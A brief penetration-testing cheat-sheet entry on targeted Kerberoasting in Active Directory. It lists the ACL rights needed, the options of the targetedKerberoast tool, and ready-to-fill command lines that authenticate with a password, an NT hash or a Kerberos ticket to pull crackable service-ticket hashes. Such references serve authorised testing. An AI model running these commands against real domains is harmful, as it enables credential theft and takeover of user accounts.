# targetedKerberoast

% acl, GenericWrite
#plateform/linux #target/remote #cat/ATTACK/ACL-ABUSE

## requierements
```
GenericAll, GenericWrite, WriteProperty or Validated-SPN 
```

## attack 
https://github.com/ShutdownRepo/targetedKerberoast
--request-user username (just the username, no domain needed)
-o file       to write ciphers in JtR/hashcat format
--use-ldaps   Use LDAPS instead of LDAP
--only-abuse  Ignore accounts that have an SPN
--no-abuse    Don't attempt targeted Kerberoasting
```
targetedKerberoast.py -v -d <domain> -u <user> -p <password> 
```

## attack pth
https://github.com/ShutdownRepo/targetedKerberoast
--request-user username (just the username, no domain needed)
-o file       to write ciphers in JtR/hashcat format
--use-ldaps   Use LDAPS instead of LDAP
--only-abuse  Ignore accounts that have an SPN
--no-abuse    Don't attempt targeted Kerberoasting
```
targetedKerberoast.py -v -d <domain> -u <user> -H <nt_hash> 
```

## attack ptt
https://github.com/ShutdownRepo/targetedKerberoast
--request-user username (just the username, no domain needed)
-o file       to write ciphers in JtR/hashcat format
--use-ldaps   Use LDAPS instead of LDAP
--only-abuse  Ignore accounts that have an SPN
--no-abuse    Don't attempt targeted Kerberoasting
```
export KRB5CCNAME=<ticket>
targetedKerberoast.py -v -d <domain> -k --no-pass 
```


